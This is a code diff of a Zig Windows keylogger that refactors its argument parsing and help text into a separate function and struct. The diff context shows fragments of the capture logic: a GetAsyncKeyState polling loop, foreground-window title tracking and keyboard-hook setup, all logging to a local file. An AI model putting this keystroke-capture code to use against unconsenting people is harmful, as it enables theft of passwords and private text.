@@ -1,10 +1,13 @@
 const build_options = @import("build_options");
 const c = @import("c");
 const std = @import("std");
+const Allocator = std.mem.Allocator;
+const Io = std.Io;
 const Writer = std.Io.Writer;
 const eql = std.mem.eql;
 const f = std.fmt.bufPrint;
 const print = std.debug.print;
+const parseInt = std.fmt.parseInt;
 
 const win = std.os.windows;
 // std.os.windows (0.17) lacks these message-type integers; define them here.
@@ -73,8 +76,94 @@ const Globals = struct {
 };
 var globals: Globals = undefined;
 
-pub fn main(init: std.process.Init) !void {
-    const minimal = init.minimal;
+const base_help =
+    \\Usage: keylogger.exe [<options>]
+    \\
+    \\Options:
+    \\-h, --help                Print this help.
+    \\-v, --verbose             Verbose output.
+    \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
+    \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
+;
+const sleep_help =
+    \\
+    \\-s, --sleep <msec>        Time to sleep in milliseconds (loop method only). Default: 10
+;
+const usage = base_help ++ if (build_options.METHOD == .loop)
+    sleep_help
+else
+    "";
+
+const Args = struct {
+    verbose: u8 = 0,
+    use_date: bool = false,
+    sleep: i64 = 10,
+    output_format1: std.ArrayList(u8),
+    output_format2: []u8,
+    output_path_b: []u8,
+    output_path_s: []u8 = undefined,
+    output_path_l: []u8 = undefined,
+};
+const ArgError = error{ InvalidArgs, HelpRequested } || Allocator.Error || std.fmt.ParseIntError;
+
+fn parseArgs(gpa: Allocator, io: Io, argv: std.process.Args) ArgError!Args {
+    var args_iter = argv.iterate();
+    defer args_iter.deinit();
+    _ = args_iter.next();
+
+    var args: Args = .{
+        .output_format1 = try .initCapacity(gpa, 1024),
+        .output_format2 = try gpa.allocSentinel(u8, 1024, 0),
+        .output_path_b = try gpa.alloc(u8, 1024),
+    };
+    while (args_iter.next()) |arg| {
+        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
+            return error.HelpRequested;
+        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
+            args.verbose += 1;
+        } else if (eql(u8, arg, "-vv")) {
+            args.verbose = 2;
+        } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
+            if (args_iter.next()) |next_arg| {
+                args.output_format1.clearRetainingCapacity();
+                try args.output_format1.appendSlice(gpa, next_arg);
+            }
+        } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
+            args.use_date = true;
+        } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
+            if (args_iter.next()) |next_arg| {
+                args.sleep = try parseInt(i64, next_arg, 10);
+                if (args.sleep < 10) {
+                    args.sleep = 10;
+                }
+            }
+        } else {
+            print("ERROR: unrecognized argument: {s}\n", .{arg});
+            return error.InvalidArgs;
+        }
+    }
+
+    if (args.output_format1.items.len == 0) {
+        if (args.use_date) {
+            try args.output_format1.appendSlice(gpa, "keylogger_%Y%m%d_%H%M%S.log");
+        } else {
+            try args.output_format1.appendSlice(gpa, "keylogger.log");
+        }
+    }
+
+    const len = @min(args.output_format1.items.len, args.output_path_b.len - 1);
+    @memcpy(args.output_format2[0..len], args.output_format1.items[0..len]);
+    args.output_format2[len] = 0;
+
+    const now = Io.Clock.real.now(io).toSeconds();
+    const now_lt = c.localtime(&now);
+    args.output_path_l = c.strftime(args.output_path_b.ptr, 1024, args.output_format2.ptr, now_lt);
+    args.output_path_s = args.output_path_b[0..args.output_path_l];
+
+    return args;
+}
+
+pub fn main(init: std.process.Init) !u8 {
     const gpa = init.arena.allocator();
     const io = init.io;
 
@@ -88,77 +177,28 @@ pub fn main(init: std.process.Init) !void {
     var stderr_writer = std.Io.File.stderr().writer(io, stderr_buffer);
     const stderr = &stderr_writer.interface;
 
-    var args_iter = try minimal.args.iterateAllocator(gpa);
-    defer args_iter.deinit();
-    _ = args_iter.next();
-
-    var arg_output_format1 = try std.ArrayList(u8).initCapacity(gpa, 1024);
-    defer arg_output_format1.deinit(gpa);
-
-    var arg_verbose: u8 = 0;
-    var arg_use_date = false;
-    var arg_sleep: i64 = 10;
-    while (args_iter.next()) |arg| {
-        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
+    const args = parseArgs(gpa, io, init.minimal.args) catch |err| switch (err) {
+        error.HelpRequested => {
             try printHeader(stdout);
-            try printHelp(stdout);
-            return;
-        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
-            arg_verbose = 1;
-        } else if (eql(u8, arg, "-vv")) {
-            arg_verbose = 2;
-        } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
-            if (args_iter.next()) |next_arg| {
-                arg_output_format1.clearRetainingCapacity();
-                try arg_output_format1.appendSlice(gpa, next_arg);
-            }
-        } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
-            arg_use_date = true;
-        } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
-            if (args_iter.next()) |next_arg| {
-                arg_sleep = try std.fmt.parseInt(i64, next_arg, 10);
-                if (arg_sleep < 10) {
-                    arg_sleep = 10;
-                }
-            }
-        } else {
-            try stderr.print("ERROR: unknown argument: {s}\n", .{arg});
-            try stderr.flush();
-            return;
-        }
-    }
+            try stdout.print(usage ++ "\n", .{});
+            try stdout.flush();
+            return 0;
+        },
+        error.InvalidArgs => {
+            return 1;
+        },
+        else => return err,
+    };
 
-    if (arg_output_format1.items.len == 0) {
-        if (arg_use_date) {
-            try arg_output_format1.appendSlice(gpa, "keylogger_%Y%m%d_%H%M%S.log");
-        } else {
-            try arg_output_format1.appendSlice(gpa, "keylogger.log");
-        }
-    }
-
-    var arg_output_path_b = try gpa.alloc(u8, 1024);
-    defer gpa.free(arg_output_path_b);
-
-    var arg_output_format2 = try gpa.allocSentinel(u8, 1024, 0);
-    defer gpa.free(arg_output_format2);
-    const len = @min(arg_output_format1.items.len, arg_output_path_b.len - 1);
-    @memcpy(arg_output_format2[0..len], arg_output_format1.items[0..len]);
-    arg_output_format2[len] = 0;
-
-    const now = std.Io.Clock.real.now(io).toSeconds();
-    const now_lt = c.localtime(&now);
-    const output_path_l = c.strftime(arg_output_path_b.ptr, 1024, arg_output_format2, now_lt);
-    const arg_output_path_s = arg_output_path_b[0..output_path_l];
-
-    if (arg_verbose >= 1) {
+    if (args.verbose >= 1) {
         try printHeader(stdout);
         try stdout.print("method: {s}\n", .{@tagName(build_options.METHOD)});
-        try stdout.print("output format: '{s}'\n", .{arg_output_format1.items});
-        try stdout.print("output path:   '{s}'\n", .{arg_output_path_s});
+        try stdout.print("output format: '{s}'\n", .{args.output_format1.items});
+        try stdout.print("output path:   '{s}'\n", .{args.output_path_s});
         try stdout.flush();
     }
 
-    var file = try std.Io.Dir.cwd().createFile(io, arg_output_path_s, .{
+    var file = try std.Io.Dir.cwd().createFile(io, args.output_path_s, .{
         .truncate = false,
         .read = true,
     });
@@ -174,7 +214,7 @@ pub fn main(init: std.process.Init) !void {
     const file_exists = stat.size > 0;
     try file_writer.seekTo(stat.size);
 
-    if (arg_verbose >= 1) {
+    if (args.verbose >= 1) {
         try stdout.print("output file size: {d}\n", .{stat.size});
         try stdout.print("output file exists: {any}\n", .{file_exists});
         try stdout.flush();
@@ -198,7 +238,7 @@ pub fn main(init: std.process.Init) !void {
         .loop => {
             var prev_type: PrevType = .init;
             while (true) {
-                try init.io.sleep(.fromMilliseconds(arg_sleep), .real);
+                try init.io.sleep(.fromMilliseconds(args.sleep), .real);
 
                 const hwnd: win.HWND = GetForegroundWindow() orelse continue;
                 const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, @intCast(title_len_i));
@@ -206,7 +246,7 @@ pub fn main(init: std.process.Init) !void {
                 const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];
 
                 if (!eql(u8, ptitle_b, ctitle_b)) {
-                    if (arg_verbose >= 1) {
+                    if (args.verbose >= 1) {
                         try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
                         try stdout.flush();
                     }
@@ -232,7 +272,7 @@ pub fn main(init: std.process.Init) !void {
                     const key_state: win.SHORT = GetAsyncKeyState(key_i);
                     if (key_state & 1 != 0) {
                         const key_name_s = try getKeyName(key_name_b, key_i);
-                        if (arg_verbose >= 1) {
+                        if (args.verbose >= 1) {
                             try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                             try stdout.flush();
                         }
@@ -249,7 +289,7 @@ pub fn main(init: std.process.Init) !void {
                 .io_writer = io_writer,
                 .stdout = stdout,
                 .stderr = stderr,
-                .verbose = arg_verbose,
+                .verbose = args.verbose,
                 .title_len_i = title_len_i,
                 .ctitle_b = ctitle_b,
                 .ptitle_b = ptitle_b,
@@ -257,7 +297,7 @@ pub fn main(init: std.process.Init) !void {
                 .prev_type = .init,
                 .file_exists = file_exists,
             };
-            if (arg_verbose >= 1) {
+            if (args.verbose >= 1) {
                 try stdout.print("setup hook\n", .{});
                 try stdout.flush();
             }
@@ -268,7 +308,7 @@ pub fn main(init: std.process.Init) !void {
             };
             defer _ = UnhookWindowsHookEx(hook);
 
-            if (arg_verbose >= 1) {
+            if (args.verbose >= 1) {
                 try stdout.print("main wait\n", .{});
                 try stdout.flush();
             }
@@ -343,28 +383,6 @@ fn handleKey(ki: u8) !void {
 fn printHeader(stdout: *Writer) !void {
     try stdout.print("Keylogger " ++ build_options.VERSION ++ "\n", .{});
     try stdout.print("Copyright (C) 2009 Christian Mayer <https://fox21.at>\n\n", .{});
-    try stdout.flush();
-}
-
-fn printHelp(stdout: *Writer) !void {
-    const base_help =
-        \\Usage: keylogger.exe [<options>]
-        \\
-        \\Options:
-        \\-h, --help                Print this help.
-        \\-v, --verbose             Verbose output.
-        \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
-        \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
-    ;
-    const sleep_help =
-        \\
-        \\-s, --sleep <msec>        Time to sleep in milliseconds (loop method only). Default: 10
-    ;
-    const help = base_help ++ if (build_options.METHOD == .loop)
-        sleep_help
-    else
-        "";
-    try stdout.print(help ++ "\n", .{});
     try stdout.flush();
 }
 
